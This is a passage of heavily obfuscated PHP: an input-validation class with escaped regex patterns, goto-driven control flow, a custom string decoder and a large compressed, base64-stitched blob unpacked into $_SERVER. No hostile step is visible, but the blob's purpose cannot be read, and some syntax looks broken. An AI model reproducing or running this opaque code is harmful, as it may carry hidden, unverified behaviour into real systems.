"\150\141\x73\103\150\151\156\x65\x73\x65" => "\x2f\x28\x5b\134\x78\x7b\64\145\60\x30\x7d\55\134\x78\x7b\x39\x66\141\65\x7d\x5d\x2b\51\57\x75", "\x65\155\x61\x69\x6c" => "\x5c\167\53\50\133\x5c\56\x5c\55\135\x5c\x77\53\x29\52\134\x40\134\x77\x2b\50\x5b\134\x2e\x5c\x2d\135\134\167\53\51\x2a\134\56\134\167\53", "\160\x68\157\x6e\145" => "\x31\x5b\63\55\x39\x5d\134\x64\173\71\x7d", "\x74\145\154\x70\x68\157\156\x65" => "\x28\134\50\x5c\144\173\x33\x2c\x34\175\x5c\x29\x7c\134\144\173\x33\54\x34\x7d\x2d\x7c\134\163\x29\x3f\134\144\173\x37\x2c\x31\64\x7d", "\165\162\x6c" => "\x28\150\x74\164\160\x7c\x66\x74\x70\174\150\x74\164\x70\163\51\72\x5c\x2f\x5c\x2f\133\x5c\167\134\55\x5f\135\x2b\x28\x5c\x2e\x5b\134\167\x5c\x2d\137\x5d\53\51\x2b\x28\x5b\x5c\167\134\x2d\134\56\54\100\77\136\75\45\x26\x3a\134\x2f\176\x5c\x2b\x23\x5d\x2a\133\x5c\x77\x5c\x2d\x5c\100\x3f\x5e\75\x25\x26\x5c\x2f\x7e\x5c\x2b\43\x5d\51\77", "\x75\162\x6c\x46\165\154\154" => "\133\x61\x2d\172\101\x2d\172\135\x2b\72\x5c\57\134\x2f\x5b\136\x5c\163\135\52", "\151\x70" => "\x28\134\144\x7b\61\x2c\x33\x7d\x5c\56\51\x7b\63\x7d\50\x5c\x64\x7b\61\x2c\63\x7d\x29", "\172\x69\160" => "\133\61\55\71\135\x5c\144\173\x35\175\50\77\x21\x5c\x64\51", "\151\x64\x43\141\x72\x64" => "\x28\x5c\144\x7b\61\x35\175\51\174\x28\x5c\144\x7b\61\67\175\x28\x5c\x64\174\130\x7c\170\51\51", "\x63\x6f\x6c\157\162" => "\43\50\x5b\60\x2d\71\x41\x2d\x46\141\55\x66\x5d\173\63\x7d\174\x5b\x30\x2d\x39\x41\55\106\141\x2d\x66\x5d\173\x36\175\51", "\x74\151\x6d\x65" => "\x28\133\60\x2d\x31\135\134\x64\x7c\x32\133\60\55\64\x5d\x29\72\133\x30\x2d\65\135\x5c\x64", "\144\141\164\x65" => "\x5c\144\x7b\x34\x7d\133\55\134\x2f\x5d\x3f\x28\60\x5b\61\x2d\71\135\x7c\x31\x5b\x30\x2d\62\x5d\x29\133\x2d\134\x2f\135\x3f\50\x5b\60\x2d\62\x5d\x5c\x64\174\63\x5b\x30\x2d\61\x5d\x29", "\144\x61\x74\x65\x54\151\x6d\x65" => "\x5c\x64\x7b\64\175\x5b\55\x5c\x2f\x5d\x3f\50\x30\x5b\61\55\71\x5d\x7c\x31\133\x30\55\62\x5d\51\x5b\x2d\134\57\135\x3f\x28\x5b\x30\55\x32\x5d\x5c\144\174\x33\133\x30\55\x31\x5d\51\134\163\53\50\x5b\x30\x2d\x31\135\134\x64\174\x32\x5b\x30\x2d\x34\x5d\51\72\x5b\60\55\x35\x5d\x5c\144", "\x70\141\163\163\x77\157\x72\144" => "\x28\x3f\x3d\56\x2a\x5c\144\x29\50\x3f\x3d\56\x2a\x5b\x61\55\x7a\x5d\51\50\77\x3d\x2e\52\x5b\x41\x2d\x5a\x5d\51\56\x7b\70\54\x32\x30\x7d", "\x6b\145\171" => "\x5b\x41\x2d\x5a\141\55\x7a\60\55\71\137\x5c\55\x5c\x2e\135\53", "\x6b\x65\x79\106\165\154\x6c" => "\133\x41\55\x5a\141\x2d\172\60\x2d\x39\x5f\x5c\x2d\x5c\x2e\x5c\x73\x2c\x5d\53"); if (!$F⎙է) { return $B; } return $B[$F⎙է]; } public static function check($f, $E£, $f֢ = null) { $A =& $_SERVER[]; switch ($E£) { case $A[7]: return in_array($f, $f֢); break; case $A[1898]: return floatval($f) > $f֢; break; case $A[1899]: return floatval($f) < $f֢; break; case $A[325]: return strlen($f) >= $f֢[0] && strlen($f) <= $f֢[1]; break; case $A[325]: if (is_array($f֢)) { return strlen($f) >= $f֢[0] && strlen($f) <= $f֢[1]; break; } else { return strlen($f) == $f֢; break; } case $A[321]: return floatval($f) >= $f֢[0] && floatval($f) <= $f֢[1]; break; } $A = self::reg(!1); $E£ = isset($A[$E£]) ? $A[$E£] : $E£; if (substr($E£, 0, 1) != $A[8]) { $E£ = $A[1900] . $E£ . $A[1901]; } return preg_match($E£, $f) === 1; } public static function get($ĉſ, $aȉ = null, $Bס = null, $D͏۫ = null) { goto a; bڽ: return $e[$ĉſ]; goto b; bΫ: if (!is_null($D͏۫)) { $Cߛ[$D[1027]] = $D͏۫; } if (!is_null($aȉ)) { $Cߛ[$D[1896]] = $aȉ; } $e = Input::getArray(array($ĉſ => $Cߛ)); goto bڽ; a: $D =& $_SERVER[]; $Cߛ = array(); if (!is_null($Bס)) { $Cߛ[$D[34]] = $Bס; } goto bΫ; b: } } goto a; FɆ: define($_SERVER[][1948], 1); define($_SERVER[][1949], 2); define($_SERVER[][1950], 3); goto F; Bƫ: if (!function_exists('_kodDe')) { function _kodDe($d) { $d = base64_decode($d); $cшٶ = strlen($d); $fȵ = ''; $F˃ = ord($d[0]) - 30; for ($eՐ = 1; $eՐ < $cшٶ; $eՐ += 2) { if ($eՐ + 1 < $cшٶ) { $fȵ .= chr(ord($d[$eՐ + 1]) + $F˃); $fȵ .= chr(ord($d[$eՐ]) + $F˃); } else { $fȵ .= chr(ord($d[$eՐ]) + $F˃); } } return $fȵ; } } define("\363\201\371\273", "\373\242"); $_SERVER[] = explode("\174\3\174\2\174\4", gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\235\175\11\140\33\305\325\60\205\2\45\134\51\224\243\224\300\306\111\210\355\350\260\35\347\162\142\73\262\45\333\112\154\313\221\344\70\301\62\312\112\132\111\153\113\132\171\167"."\45\133\116\302\131\356\233\162\337\127\132\216\22\50\167\70\113\51\127\12\224\102\241\174\244\241\224\346\340\10\167\313\121\132\370\347\236\331\225\114\333\237\326\321\314\233\67\263\163\274\171\363\146\346\275\67\267\77".base64_decode('seOFiy5+5m+vbl63x7rd133/s1O/Puv/rnrj0k/ewnHwvz3QHwgfffYPdkP/7ZFd8UTv7vVTm5997g==')."\xce\xb7\xb6\x3d\xb7\xf4\xed\x6b\xe\x9f\x7a\xf1\xbc\xcd\x7\x8d\xfd\xed\xc6\x7a\x75\xd9\xe2\xbb\xf6\xdf\xf0\xca\xbd\x5b\xbb\xf6\x3b\xfa\xa3\xcd\xe6\xea\x99\x91\xa6\x8f\x36\x7c\x96\x7c\xf3\xf9\xbb\xd6\xa7\x4e\xb8\xef\xa3\x47\x6e\xfc"."\x7e\x4f\xdf\xf5\xab\x6f\x9d\x27\x3f\xb7\x47\x54\x3f\xf0\xb7\xff\xfc\xd1\xc4\x8f\x7e\xb9\xf1\xb5\xcd\x53\xaf\xbd\x6e\x4d\x2e\xfb\xfb\x4b\x2f\x7d\xf6\xfe\x3b\xd6\x9e\xd8\xb3\xcf\xd\x9b\xbe\xc8\x1e\xbb\x75\xee\xc2\x3f\x1e\x11\xf9\xf6"."\204\333\357\171\144\363\123\261\236\173\356\274\174\274\347\173\127\267\167\136\360\346\117\246\234\122\375\305\133\23\233\273\136\177\52\352\372\376\370\165\177\333\253\273\373\223\131\351\27\326\354\175\362\370\3\357\16\234".base64_decode('/c0673GnTXXued+ev2y7+odtZ1708SszW195c8GTy9J/Wl591c/3XPviyz++asOiqxwX3TL0mynTEg==').strrev('=9Nu$~o|?n?|fל蹾-ɟ5\'Ί3!').base64_decode('2MP70QM/Ojxas/8z93xeOqRvxmUfeFoOe+2sh8d+f/b5T9x6TKg1r558cPyotkdT35tf3fjLbR2v7Q==').base64_decode('fPzmReeYVZnFM0dn/OTiKecfvPtfDt14/74u/wnfW7Th0Ev+svtuu+GObsI/Uk4zJWVcNUwDA+JaLg==')."\xa9\xa6\x70\x58\xcd\xe1\x5f\x37\xfe\x31\x46\x33\xaa\xa9\xe0\x70\xb4\x37\x10\x8e\x86\xfa\xfb\xfa\x7c\xc1\x70\x94\x94\x28\xa6\x67\xb5\x4\x9\xe5\x65\x5d\xce\x92\xc2\xf3\x8a\x6e\x80\x4f\x89\xc5\x45\xf3\x5a\x5e\xc9\x59\x20\x1c\x90\x90".base64_decode('TTkmG6Qkb1vU6+vrDqyOhlf3+QhGLDpaUPQSjqFgyJR1M6xmFYYxprN6tfk6/b1SOOjpDXnaw/5ALw==')."\6\267\7\172\172\374\341\162\170\60\320\335\335\346\151\137\136\236\322\27\364\164\366\170\44\120\277\214\22\125\163\111\255\132\132\203\123\326\110\65\70\320\241\52\231\4\16\346\144\132\35\263\224\47\241\60\13\201".strrev('ۯrUAÙu78榦PbR}6Y$bϤ2)%R!e21').strrev('[jP_^'."\n".'pb͒	Y4wO$C|--F7\'_.S'."\r".'C"G`5`')."\55\361\176\212\153\331\254\226\163\201\122\300\170\232\102\125\175\301\40\16\70\10\5\167\373\341\320\221\110\240\243\43\344\143\61\322\270\25\335\240\46\163\11\225\132\142\211\144\306\214\26\345\114\201\22\353\10\376".base64_decode('nU1+yK9mEAIeVXNqgRArKULT2MwhgQLFVigkC7JpZE6BCVbEweYW/LuYIMWiME3RzaiSi2sJNUemYQ==')."\x2b\x99\x72\x84\xf0\x64\x33\xed\xd5\x55\x80\x47\xa\xd4\x5c\x71\x2d\x5f\xea\xd1\x8a\xa4\xd\x49\x35\xa3\x74\xb3\x59\x96\xd4\x32\x9\x45\xe7\xf1\x3c\xc8\x2e\xa6\x90\xc6\xa8\x13\x42\xee\xde\x42\x56\x44\x61\xd1\x78\x5a\xcd\x24\x74\x3a".base64_decode('Ob8Ls54Uq5gmaIZBa9qfz2hyIqToQu07QDGBgikCCwitQ9OzXsAASO8Aslf7KySMUMJPCJ3iIoyreg==')."\360\44\347\67\103\203\113\301\77\65\204\213\105\110\325\322\112\46\23\125\306\25\62\101\262\211\171\6\255\275\333\210\251\71\67\200\340\250\77\20\115\313\106\272\47\61\57\212\162\121\346\230\120\306\135\371\164\236"."\xcc\x61\x36\x6d\x23\x16\x2\x86\xfd\xdd\xab\x99\x3e\x81\xc5\x66\xb4\xb8\x9c\x11\x5b\x8a\xc3\x69\xd3\xcc\x87\x94\x5c\x2\x76\x8\x69\x91\x36\x96\x43\x1d\x96\x57\x14\x82\xe4\x75\x48\x9\xa9\x47\x5a\x2d\x75\x35\xa9\x4d\x94\xba\x0\xad"."\x24\x4b\x9c\xe3\xa5\xcd\x6c\x86\x85\x68\x6b\x19\xcc\x60\x40\x73\x9c\xd0\x44\x15\x89\x2b\xe3\x26\xe9\x24\x69\x71\x3c\x2d\xeb\x60\xf8\x9a\xb\x66\xd2\xb9\x90\x30\x8e\x7c\x3e\xa3\xc6\x65\x53\xd5\x72\x6e\x2d\x6e\x2a\xa6\xd3\x30\x75\x45"."\46\245\125\55\226\40\105\300\31\134\213\163\321\331\323\256\345\114\60\175\235\141\135\316\31\111\105\167\372\10\171\67\111\240\237\31\7\243\150\136\325\310\153\206\12\77\323\44\311\246\51\307\323\160\366\363\342\233".strrev('}RA0ΥF^fDS8	'."\n".'m2zq,pǉRe_').strrev('a# u&'."\0".'p8ΓX*?`'."\n".'t0o_&gC=RM')."\x68\x57\x38\xdc\x17\xf5\x77\x80\xc5\xb8\xd7\x17\xed\xf1\x84\xdb\xbb\x48\xb5\x4d\x39\x45\xeb\xdc\xd\x78\x2f\x2b\x92\x2\x57\x39\xc1\x94\x83\x84\xd6\xb\xfa\x88\x3\xfb\xb4\x31\x45\x7\x1f\x6e\x2b\x35\x49\x23\x5a\x22\xa6\x8d\xbb\x68"."\22\104\16\1\56\101\221\141\217\346\115\147\120\316\245\140\377\304\112\246\102\310\321\50\246\254\35\332\255\344\122\146\232\146\14\371\202\53\175\301\150\50\320\21\36\360\4\311\62\236\3\3\61\116\77\5\213\316"."\70\203\112\2\164\175\334\244\371\344\74\354\65\212\3\47\12\34\143\232\12\47\17\115\353\366\167\302\216\361\72\15\200\344\24\261\150\331\335\152\126\205\165\67\131\12\352\111\260\306\167\222\12\271\121\203\232\43"."\xe9\xda\xea\x48\x62\x4e\x8d\x13\xfc\x5b\x5b\x33\x18\xf1\xba\x6a\x87\x5a\xdd\x2a\xcf\xe3\xae\x77\xd5\x4b\xd\x75\xf3\xa5\x3e\x20\x74\xa8\x72\x46\x22\x8d\x2e\xc3\xa8\x93\x2\xcb\xbf\xa3\x3\xe0\x9a\x24\x4c\x73\x5b\xd7\x61\x60\xd0\xb7"."\xa2\xdf\x17\xa\x47\x7b\x7c\xe1\xae\x80\x97\x7c\xc1\xe7\x21\xa1\x6e\xd\x4f\x4d\xda\xa2\x41\xfc\x33\x44\x46\x10\x88\xa\x29\x25\xae\x65\x34\x5d\xce\x40\x6\x44\xe9\x4d\xa1\x4c\x20\xa5\x26\x39\x5f\xf7\x3\x81\x86\x74\x2c\xe6\x7c\x3c"."\22\122\263\171\312\240\314\164\41\33\23\202\156\136\2\241\5\60\144\214\55\151\154\15\322\164\22\152\162\223\54\263\32\72\50\263\165\207\346\202\377\163\316\232\320\262\62\225\104\321\304\125\22\170\346\142\120\255".base64_decode('JaVLkfmiZuqmBqG6BaVHMdMa6eeUQqtUYHWjtUwoGYX2UlqhXBqIV0XWeXldSaqEboE8BeCcC6tGEA==')."\144\202\362\15\215\17\100\61\224\3\114\316\260\145\203\63\175\30\21\126\346\216\376\356\356\150\173\240\67\14\104\121\14\31\10\372\303\76\112\21\36\157\324\323\336\307\226\60\76\114\4\1\116\317\162\366\206\41"."\305\6\201\357\363\5\202\263\134\272\320\101\226\212\303\200\27\346\265\234\241\70\343\244\264\4\147\276\30\143\261\215\363\226\345\340\2\360\270\123\316\116\70\263\212\51\73\131\325\255\353\233\24\26\227\111\77\31"."\x2\xce\x2c\x33\x60\x51\x5\xfb\xb\xba\xb0\xf6\x5\x42\x24\x43\x2b\x84\x2\x69\x24\xa6\xe8\xa4\x1e\x7d\xfd\x24\x29\x2b\xc\x7f\xa7\x8f\x0\xa7\xd0\xb5\x51\x26\x92\x8b\x67\x20\x44\x19\x5d\x1\xe0\xeb\xea\x84\xcc\xdb\xd8\x4a\xeb\x43".base64_decode('yh7PZriAFVUt4xfVYsOAiwGikyu12snHKtzl710e7Ql4fd1Rfy/gEuFyeH+f10MHX4S3BcJdFmg/4A==')."\x13\x2b\x3d\xdd\x7e\x3b\xba\x6f\x95\x3f\x14\xe\x55\x4c\x2\xb0\x7e\x9f\x2d\x5\x6c\xb9\xfa\x82\xbe\xe\xff\x2a\x16\xed\xf0\xfb\xba\xbd\xa1\x68\xbb\xa7\xbd\x8b\xe3\xf4\x7a\x7a\x48\x24\x9a\x84\x9b\x1e\xc3\x6d\xc5\x8f\x2\x86\x17\x62"."\133\247\150\21\156\3\151\147\106\55\373\224\50\225\300\243\234\116\300\342\245\20\332\44\315\205\233\117\324\22\42\23\307\265\2\245\126\46\304\145\51\203\310\312\144\206\312\164\141\252\306\77\65\222\47\44\231\371"."\50\143\5\261\22\13\242\146\320\70\20\327\310\367\45\302\174\313\152\20\205\70\155\112\122\323\225\357\2\170\222\46\43\14\133\34\314\33\236\6\106\300\203\166\271\200\22\320\210\104\351\134\64\300\376\300\103\253"."\223\344\73\314\150\0\154\305\75\160\177\32\35\10\6\172\73\111\206\261\264\102\53\340\47\335\137\115\205\31\262\115\65\71\113\2\222\210\314\205\112\332\351\303\32\355\312\165\370\347\30\374\3\204\67\362\161\45".base64_decode('R3s9BhkzYxx0DwJmC2WqWoF9LaZpGTqPwXrM+AXb4A4blEjGKXOaQ1ctsjiEA8t9vVFKWTgmUCMGgA==').base64_decode('LWMgSDrE1EboBgYnBn0hygV0ZbSg0u5yu+YQKlbA+kM+7z4uMjanetA5xzUEAjW1S3GUxCIuS3QmyQ==')."\x5f\xd0\x59\x6e\x28\xa6\x54\x1b\xad\x35\x4d\x11\x77\xc4\x5d\xdd\xda\x34\xe8\x71\x4e\xc8\xce\x89\x3a\xe7\x22\xe7\xd0\x9c\x88\xab\x66\xe\x1\xc\xad\x6d\x70\x34\xae\x87\x8\x0\xb1\x75\xc6\x10\xf8\x69\x8e\xb4\xce\x8a\x38\x8f\x39\x7e"."\315\322\301\310\320\354\246\71\323\43\256\31\221\261\241\332\232\126\372\235\170\101\7\233\263\170\211\125\65\61\247\32\124\11\210\57\14\45\207\130\242\200\100\23\46\324\74\207\256\235\277\236\302\301\30\52\51\236".base64_decode('Y9AZmTPUKuQTQPZvAdEF8Oc0w/M4j4UtY1nhvCf0UcjFOXeF8yImxwkfUFM5NoXAgs42xVapee0s/A==').base64_decode('u54OZEqhyzI8z9IJdRZy6ijd6ueUURLQTErfMcUcUyh5ALglDoiDbttAkhDLICGNfIFvlxS0dyCtyA==')."\107\241\330\65\306\142\11\45\107\306\151\37\202\155\304\345\274\22\22\132\30\215\206\75\155\335\276\50\345\60\204\23\323\70\342\212\155\354\160\14\64\215\163\124\312\37\342\134\144\66\106\63\22\142\6\222\242\353"."\232\336\204\16\376\214\102\36\312\142\140\327\144\202\376\224\300\126\132\152\156\221\160\67\23\56\21\25\73\75\57\123\151\2\356\156\231\204\340\256\216\104\12\203\112\142\150\20\20\262\354\114\16\255\235\273\276\206"."\x4a\xc9\xee\x8\xf8\x8f\x46\x30\xff\x22\x35\xce\xf3\xf1\x33\x80\xac\x15\x37\xd9\x82\x5b\x76\x3e\x15\x65\x1c\x10\x56\x81\x1d\x33\x68\x3a\x5b\x67\x21\x9c\x4b\xad\xa6\x66\xca\x19\x86\x6\xd3\xc2\x10\x42\xb9\xd\x5d\xab\xc9\x1e\x1d\xf".base64_decode('YDdnQnB1Fk7vEIfsZUdT7MRBODgCMIcQxf82V1E2nQMToZ0vUn6vkwyiZ5XTTwR4FlCpqCmD6WxSqA==')."\241\25\364\270\302\160\54\102\206\51\353\140\315\342\222\35\224\301\204\343\105\120\163\7\74\207\160\300\65\325\1\244\75\7\74\357\161\160\211\325\301\217\20\34\114\376\164\20\261\324\301\113\47\101\277\327\241\32"."\136\44\36\243\162\121\22\255\263\231\206\33\362\214\134\162\340\372\167\53\105\45\343\240\265\167\320\106\71\150\13\34\150\277\341\45\265\351\7\364\101\152\203\202\200\111\244\35\160\70\340\330\322\122\140\220\166\3"."\23\252\35\134\340\166\244\164\255\220\357\243\137\22\142\270\62\4\300\153\312\0\101\115\63\35\164\3\304\2\75\214\3\301\352\360\320\112\76\340\274\366\154\371\44\115\300\161\173\35\60\24\246\167\310\105\161\200"."\x2b\xe\x76\xce\x4a\x18\xfc\x94\x94\x9f\xe6\x71\x71\xc9\xbe\x11\xb1\x1f\xf\xf1\x4e\xe4\x95\x8\xcb\xa9\x90\xf0\x79\x53\x4e\xd1\x6f\x57\x48\xc5\xe1\xa0\x12\x2f\xc5\xf9\xe6\xc6\x2b\xec\x96\xac\x31\x36\xf4\x88\xe\x2b\x11\x53\xe5\xa1".base64_decode('ZwTCaG3KPvtQyuZ0RMjHQmyTUjdvUyDPVxzIEEKADwpTnoICnMMUyAopG3Eqy4zRewqFwoT609Zbyg==')."\205\121\76\63\151\23\45\130\200\103\340\331\160\164\234\174\210\205\50\371\121\265\50\356\327\150\226\355\54\130\107\333\230\21\354\367\76\65\127\122\163\342\336\235\103\71\317\343\104\1\311\233\307\160\37\117\26\306"."\274\205\237\15\70\310\231\201\3\354\33\107\4\256\307\367\270\240\366\60\253\120\167\122\222\255\346\164\2\72\255\121\76\37\373\301\66\51\152\43\125\102\244\151\131\347\275\114\347\30\44\154\326\52\3\242\360\250"."\x80\x96\x94\x8b\x9c\xdd\x5b\xf2\x8\x33\xc3\x30\x4b\xec\x98\x43\x8\x5a\xb\xc5\x51\xef\x64\x91\x2e\xb6\xfb\xab\x14\x15\x27\x9d\x6a\x74\x83\xde\xac\x14\x46\x2d\xd\x6b\x15\xa3\x48\x2a\x90\x80\x3c\x40\x8f\xc9\xa8\x78\x1f\xb5\x1d\x33"."\200\250\60\122\121\313\211\4\256\206\207\261\76\40\330\144\300\10\350\56\70\111\72\41\143\23\127\41\276\102\101\146\212\303\2\122\336\316\3\55\274\272\322\302\147\347\326\66\250\55\312\77\152\341\73\145\253\23".strrev('%d&;޸NSk]XN]?6s.v>GZ,N')."\xb2\x63\xe0\xe2\xbb\x35\x2a\xb\x43\xfa\xf7\x25\x54\x13\x42\x20\x37\xd3\xe8\xa1\x15\x47\x14\xd8\x3c\x83\x9\x5\xa2\x2e\x71\x95\x8d\x41\x46\x1d\x21\xb9\x1c\xb3\x2c\x98\x95\x38\xb9\xab\x16\xf1\x5c\x17\x5f\x7b\xc4\x95\x4b\xbc\x55\x82"."\150\274\345\360\226\12\207\204\373\330\54\273\266\102\100\227\141\152\171\236\42\104\161\262\220\304\13\25\260\130\347\243\32\202\25\40\201\344\3\336\205\10\227\344\105\22\64\46\156\127\6\140\270\104\126\344\321\165"."\x4a\x24\xb8\x79\xf0\x4\x7\x0\x45\x10\x9c\xae\x21\x7a\x82\x58\x89\x23\xe3\xc2\x7d\x45\x7e\xcf\x8a\x8b\x82\x1f\x76\xe1\x5\xca\x25\x27\x12\x1\x7a\xbc\x26\x86\xcb\x51\xc5\xd3\x84\xca\x5\xa1\xab\x6f\x56\x94\x10\xab\x8c\xee\xc9\x64".base64_decode('+D2aPT5pFjxXxUwiZNJsHUgIpgfclWBMpuuw0RCfcfye0i7yWpnPfxLHymYAH9DKccgf02pOMdjKpA==')."\33\225\370\314\177\222\157\54\122\257\125\220\21\45\30\262\34\362\346\212\335\12\311\177\62\132\200\151\302\241\22\330\103\1\200\270\216\260\223\23\316\167\204\245\22\55\73\121\323\262\354\7\121\31\302\174\260\14"."\61\230\177\270\105\35\272\226\365\7\300\374\252\114\164\166\74\205\236\35\41\246\66\316\266\144\142\46\100\44\160\25\232\254\114\232\314\212\342\113\326\233\217\175\363\365\67\357\341\360\205\317\275\212\3\363\310\31".base64_decode('M/jf98D/UJjrG526aq3256d/2Hni8VNn379n57kvfvHWo1c+9PG7H868Zt3L7x51UfTcM2dtWhLs1A==')."\x4b\xdb\x82\x63\xbf\xf8\xe7\xd1\x37\x65\xdf\xfe\xd7\x85\x55\xbe\xa1\xeb\x5d\xc7\xde\xdb\xb1\xef\xbd\x4b\x7f\xb2\x78\xe9\xd9\xdf\xf7\xbf\xa4\x85\x56\x6f\x7e\xe0\x9d\x8b\x16\x3f\xbc\xed\x9a\x9b\xfe\x38\xf5\xf9\xad\xff\xf7\xa7\x5d\xcf".base64_decode('a8fPXTv+4eLf/vr8Ez7+8o5ntO1fnr7X/fs6X/j4hUdi1acd99eLftXeuG2/jxt/M/0F9fWZ33Mc8w==')."\232\143\363\141\233\347\65\107\357\30\365\167\355\261\354\310\206\47\277\367\321\214\277\34\355\75\112\373\272\267\361\376\313\336\320\317\370\366\204\13\256\310\167\173\227\167\236\167\123\307\364\3\302\163\77\65\135\133"."\246\47\252\16\71\372\374\247\324\345\233\347\231\303\7\337\371\334\312\47\245\206\133\57\277\345\147\317\336\164\275\354\365\113\177\177\366\266\71\57\266\36\151\356\261\353\240\263\266\357\77\155\277\166\371\346\137\271".strrev('u_%s]{ip<]#|^[]nr5|3_o~')."\263\251\335\77\176\353\127\357\125\335\66\170\333\43\357\277\160\372\127\347\66\275\261\60\233\131\362\345\273\75\377\70\245\360\372\36\55\106\366\254\113\332\374\13\76\55\234\262\74\171\351\115\227\354\173\232\174\351"."\x5\xcf\xcd\xda\x6b\x7e\xf6\xc0\x8b\xb7\xbc\x7f\xdf\x78\x7c\xe1\xee\xaf\xcc\x7f\xa5\xe3\x17\xf\xfc\x7e\xcb\x96\xad\x6f\x26\x6f\xba\x3d\xe9\x5b\x7e\x7f\xf3\xfd\x91\x3b\x57\xdd\xf1\xea\xed\xa5\xfd\x52\x3f\xad\xbe\xf2\xb5\xe1\x65\xab"."\335\127\316\172\351\311\171\201\113\46\156\75\257\173\317\27\77\77\354\244\25\267\376\350\371\266\37\277\272\351\267\125\241\307\257\377\133\303\313\373\235\273\274\152\355\306\77\165\337\164\333\25\227\124\375\371\245\353".strrev('VMo+x>gr[N(}UN}gKmϩ8n'."\n".'^')."\xae\x4d\x5c\x78\xf5\xdf\xae\xdb\x38\xed\x65\xe7\x96\xb\x5b\x5a\x3e\x79\x66\xe3\xa5\xee\x39\xca\x1e\x3b\x37\xdd\x5c\x78\xeb\xfa\x3d\xf\x58\xf8\x47\x63\xd5\x3\xcf\xe6\xaa\x77\xdd\xd4\xe9\xdb\x10\xfe\xc3\x7b\x53\x9e\xdf\x1a\xff\x78"."\267\323\17\70\154\372\123\71\367\212\151\67\36\264\307\211\117\46\322\107\157\132\270\105\373\353\324\330\123\117\276\236\76\166\325\165\215\263\336\370\173\135\335\201\273\357\245\116\373\374\343\25\207\277\330\265\146\277"."\252\275\177\376\340\353\147\217\377\356\336\37\177\334\224\177\357\34\317\363\235\361\77\317\152\10\236\172\306\65\13\157\370\355\357\365\216\316\350\173\363\117\75\244\64\166\372\103\371\305\247\255\111\56\174\363\151\327"."\335\327\374\341\67\207\255\110\74\170\377\202\273\357\172\160\353\345\247\136\320\52\375\364\347\207\375\374\173\117\67\107\177\173\363\371\267\334\27\377\311\151\357\254\35\57\76\273\156\223\357\310\366\361\75\275\373\377".base64_decode('JSBfuWnqgrd2e3/frc9lHpmZazp8z9s/D9y3o+H+2as/+Mj/8GmHTsn/6fNjDsxE77oo9Ub88Kcufg==')."\343\315\361\37\274\330\270\142\233\343\253\237\374\340\362\170\111\365\127\337\362\174\357\207\215\125\7\357\272\343\254\45\65\313\237\177\341\252\175\336\270\352\307\323\176\360\360\327\322\337\256\174\365\370\273\337\332\330"."\163\207\343\257\127\374\370\313\333\17\272\371\366\320\264\113\147\34\340\250\72\74\171\137\353\364\245\335\325\147\76\372\374\264\205\267\247\142\215\177\175\156\371\61\367\144\233\226\16\155\134\261\343\334\27\236\276\353"."\x95\xf0\x81\x47\xdc\x74\xcd\x2f\x17\x1d\x28\xed\x26\x65\x46\xa7\xde\x1d\x7a\xe3\xcd\x7d\x3e\x1a\xa9\xfe\xed\x21\xbe\xa7\xae\x75\xb5\x9f\x31\xed\x85\x64\x61\xc9\xcf\x1c\x4e\xff\xf4\x97\x56\x5d\xf4\xd1\xf5\x2f\x4d\xb4\x4f\x3d\x65\xea"."\xee\xbb\x95\x4e\xdb\xbc\xea\x9a\x4d\x81\x23\xbe\xff\x7a\xaf\xeb\xea\xff\x3b\xaa\xe1\xb6\x73\x96\xee\xbb\xfd\x91\x33\xf6\x6f\x8f\x1d\x7e\x7f\xff\x3d\xfe\xf9\xaf\x5d\xb8\xe1\xa6\xb\x3f\x78\x7b\xd6\x49\xcb\xae\xf0\x6e\xb8\x7e\xd3\xb4"."\247\377\372\375\145\17\174\336\364\365\360\115\133\76\330\332\277\270\331\365\360\226\67\303\173\77\372\146\372\222\316\151\63\57\76\127\31\332\162\237\174\360\53\237\246\207\152\336\333\353\266\344\263\227\15\35\372\362".base64_decode('mi+nrV743EfX7vdu14tn9k87s/qss/et1WZsfMT8ScsJz7qnbEyVLl2RvyFWO6Uv++ylyqPPnXjjhQ==')."\233\136\332\134\70\363\262\127\366\131\336\374\371\353\67\156\132\270\141\355\364\363\326\137\163\367\360\57\372\176\266\362\347\227\71\32\267\355\132\160\332\252\133\102\67\107\357\177\351\374\175\157\171\341\251\131\67\35"."\x3a\x3a\xda\xfd\xe0\x65\xfb\x3d\x7c\xf9\x8d\x8b\xc7\x7f\x78\xd3\xa2\x7f\x5d\x5b\x53\x73\xc2\x63\xf5\xbb\xd6\x7f\xdb\xf7\xfe\xa7\x23\x4f\x1d\x1f\x7f\xf6\xc5\x9f\xf7\xe5\x1e\xc9\x5c\xbe\xd7\xaa\x2b\xcf\x39\xe7\x94\xbf\x35\xdd\xde\xf8".base64_decode('wrL7qu+/+IfJC684Ym3ttAdPPuXE72tPfn6hs+s3X7yy5a7ey67bp7pm21n6tjPaT/vio78f+96KtQ==').base64_decode('dRdvX3Ziz5E/eOuDczr2fu/6R1896t69rz/p1CWBmdte/Cb/27e92Q8bP/9iy9Bu151z/Ol33V04sA==')."\x27\xb8\xee\xd1\x73\x9f\xdf\x32\xb0\xdc\xb7\x75\xfa\xf\x6f\x79\xf4\x9b\x77\xfe\x39\x6d\x8f\xfb\xce\x89\x8f\x5c\xb4\x5f\xed\x59\x7b\xf8\xb2\x8d\xff\x38\xef\xb3\xd\xfa\xa6\x70\xdd\x49\xf7\xfd\xfa\x9c\x47\x6a\x23\x67\xff\x7e\xd3\x53"."\x3f\x4b\x2e\x68\x49\x3b\xaf\xfe\xf3\xdb\x9f\xbd\xb6\x9f\xf7\xf\x77\x9c\x73\xc0\xde\xde\xbb\xee\x5b\x11\xdb\xfb\x92\x1f\x7d\xf6\x46\xe1\xcd\xc7\xd7\xf7\x2f\x58\xe6\xdb\xb0\x2e\x9e\xfd\xf7\x1b\x6f\xcc\xab\x5b\xf9\xd6\xea\xd3\x56\xbe"."\xb2\x6c\xde\x1d\x57\x6e\xdf\x74\xe8\x96\x79\x7\x37\xed\xd5\xbb\x35\x71\xfa\x70\xdb\xbf\xf2\x67\x5c\xfd\xe5\x3f\x7\x2\xd1\x6f\x3f\xd9\x79\x98\xfb\xdb\x89\x4f\xde\x7b\xee\xab\xeb\xae\x5b\xf7\xf5\xae\xaf\x9e\xba\x7d\xe0\xa3\xa1\x47".base64_decode('/vnprqdaX2xZ980/73n86sfHS998Hf3l83vsbNm28/iP484Hvzr49SNm//mSh9Y/d0zkj1v/clzbMQ==')."\175\336\27\237\274\370\251\47\157\236\366\344\336\135\233\177\160\365\215\261\155\163\16\171\244\155\366\104\144\316\23\133\227\114\234\174\344\212\